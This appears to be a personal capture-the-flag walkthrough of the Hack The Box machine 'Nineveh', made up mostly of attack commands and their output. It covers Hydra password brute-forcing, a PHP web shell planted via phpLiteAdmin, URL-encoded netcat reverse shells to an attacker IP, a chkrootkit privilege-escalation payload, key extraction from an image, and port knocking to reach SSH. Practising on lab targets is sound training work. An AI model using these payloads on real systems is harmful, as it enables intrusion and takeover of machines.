**Enumeration** 
```shell
gobuster -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://10.10.10.43 -o http-output.txt

Ignore SSL error:
root@kali:~/HTB/Nineveh# gobuster -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u https://10.10.10.43 -o https-output.txt -k
Find:
http://10.10.10.43/department/login.php
https://10.10.10.43/db/
https://10.10.10.43/secure_notes/
```
**Hydra:**
```shell
root@kali:~/HTB/Nineveh# hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.10.43 http-post-form "/department/login.php:username=^USER^&password=^PASS^:Invalid" -t 64
```
**For Department page:
[80][http-post-form] host: 10.10.10.43   login: admin   password: 1q2w3e4r5t
1 of 1 target successfully completed, 1 valid password found**
```shell
root@kali:~/HTB/Nineveh# hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.10.43 https-post-form "/db/index.php:password=^PASS^&remember=yes&login=Log+In&proc_login=true:Incorrect" -t 64
```
**For PHP Lite Admin page:
[443][http-post-form] host: 10.10.10.43   login: admin   password: password123**

**Show details by -x:
root@kali:~/HTB/Nineveh# searchsploit -x 24044.txt**

Then make reverse shells(shells.txt):

Create database "ninevehNotes.php" Field=1

Rename table:test --> Table 'ninevehNotes' 
```shell
Field input:
<?php echo system($_REQUEST["ipp"]; ?>
```
#### MOVE to Burp and change to POST:
--------------------------------------------------------------------
```shell
POST /department/manage.php?notes=/var/tmp/ninevehNotes.php HTTP/1.1
Host: 10.10.10.43
...
ipp=rm+/tmp/f%3bmkfifo+/tmp/f%3bcat+/tmp/f|/bin/sh+-i+2>%261|nc+10.10.14.11+1668+>/tmp/f
```
--------------------------------------------------------------------
#### REMEMBER Encode special character like " " ---> "+" and ";"--->"%3b" "&"--->"%26"
```shell
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.11 1668 >/tmp/f
Applied to web shell:
ipp=rm+/tmp/f%3bmkfifo+/tmp/f%3bcat+/tmp/f|/bin/sh+-i+2>%261|nc+10.10.14.11+1668+>/tmp/f
```
--------------------------------------------------------------------
**As python setting problem:**
```shell
$ python3 -c 'import pty; pty.spawn("/bin/bash")'
```
**CRON job on report, show history**
```shell
www-data@nineveh:/report$ ps -eo command
```
**LOOP history action:**
```shell
www-data@nineveh:/report$ for i in $(ps -eo command)ls ; do echo $i; done
To confirm IFS is "space" as new line:
www-data@nineveh:/report$ IFS=$'\n'
```
***write a script: procmon.sh***
```shell
--------------------------------------------------------------------
#!/bin/bash
# Loop process line by line
IFS=$'\n'

old_process=$(ps -eo command)

while true; do
	new_process=$(ps -eo command)
	diff <(echo "$old_process") <(echo "$new_process")
	sleep 1
	old_process=$new_process
done
--------------------------------------------------------------------
```
```shell
www-data@nineveh:/var/tmp$ ./procmon.sh

172a173
> sleep 1
172a173,177
> /usr/sbin/CRON -f
> /bin/sh -c /root/vulnScan.sh
> /bin/bash /root/vulnScan.sh
> /bin/sh /usr/bin/chkrootkit
...
< ps -eo command
...
```
#### "< /bin/sh /usr/bin/chkrootkit" finds exploit-db 33899
#### Then create a update file placed /tmp as /tmp/update
#### "/3"--> as Third terminal!
```shell
--------------------------------------------------------------------
#!/bin/bash
rm /tmp/3;mkfifo /tmp/3;cat /tmp/3|/bin/sh -i 2>&1|nc 10.10.14.11 4444 >/tmp/3
--------------------------------------------------------------------
```
### Other attack vector:
https://10.10.10.43/secure_notes/
##### Show hidden content: 
##### root@kali:~/HTB/Nineveh# binwalk -Me nineveh.png 
```shell
Public key:
root@kali:~/HTB/Nineveh/_nineveh.png.extracted/secret# cat nineveh.pub 
Private Key:
root@kali:~/HTB/Nineveh/_nineveh.png.extracted/secret# cat nineveh.priv 
-----BEGIN RSA PRIVATE KEY-----
...
```
##### root@kali:~/HTB/Nineveh/_nineveh.png.extracted/secret# chmod 600 nineveh.priv 
##### BUT No SSH^-^
```shell
www-data@nineveh:/etc/init.d$ netstat -alnp | grep LIST
netstat -alnp | grep LIST
(Not all processes could be identified, non-owned process info
 will not be shown, you would have to be root to see it all.)
tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      -               
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -               
tcp        0      0 0.0.0.0:443             0.0.0.0:*               LISTEN      -               
tcp6       0      0 :::22                   :::*                    LISTEN      -               
```
#### This is port knocking services~~
```shell
www-data@nineveh:/etc/init.d$ cat /etc/knockd.conf
....
[openSSH]
 sequence = 571, 290, 911 
....
Below all wrong:
for i in 571 290 911; do nmap -Pn -p $i --host_timeout 201 --max-retries 0 10.10.10.43; done
for x in 571 290 911; do nmap -Pn --host_timeout 201 --max-retries 0 -p $x 10.10.10.43; done
```
#### Real:
```shell
root@kali:~/HTB/Nineveh# for i in 571 290 911; do nmap -Pn -p $i --max-retries 0 10.10.10.43; done

Starting Nmap 7.70 ( https://nmap.org ) at 2019-06-01 00:20 HKT
Warning: 10.10.10.43 giving up on port because retransmission cap hit (0).
Nmap scan report for 10.10.10.43
Host is up.

PORT    STATE    SERVICE
571/tcp filtered umeter

Nmap done: 1 IP address (1 host up) scanned in 1.35 seconds
Starting Nmap 7.70 ( https://nmap.org ) at 2019-06-01 00:20 HKT
Warning: 10.10.10.43 giving up on port because retransmission cap hit (0).
Nmap scan report for 10.10.10.43
Host is up.

PORT    STATE    SERVICE
290/tcp filtered unknown

Nmap done: 1 IP address (1 host up) scanned in 1.15 seconds
Starting Nmap 7.70 ( https://nmap.org ) at 2019-06-01 00:20 HKT
Warning: 10.10.10.43 giving up on port because retransmission cap hit (0).
Nmap scan report for 10.10.10.43
Host is up.

PORT    STATE    SERVICE
911/tcp filtered xact-backup

Nmap done: 1 IP address (1 host up) scanned in 1.13 seconds
```
##### Then:
```shell
root@kali:~/HTB/Nineveh# nmap -p 22 10.10.10.43
Starting Nmap 7.70 ( https://nmap.org ) at 2019-06-01 00:20 HKT
Nmap scan report for 10.10.10.43
Host is up (0.22s latency).

PORT   STATE SERVICE
22/tcp open  ssh
```
##### Finally readly to connect:
****root@kali:~/HTB/Nineveh/_nineveh.png.extracted/secret# ssh -i nineveh.priv amrois@10.10.10.43****
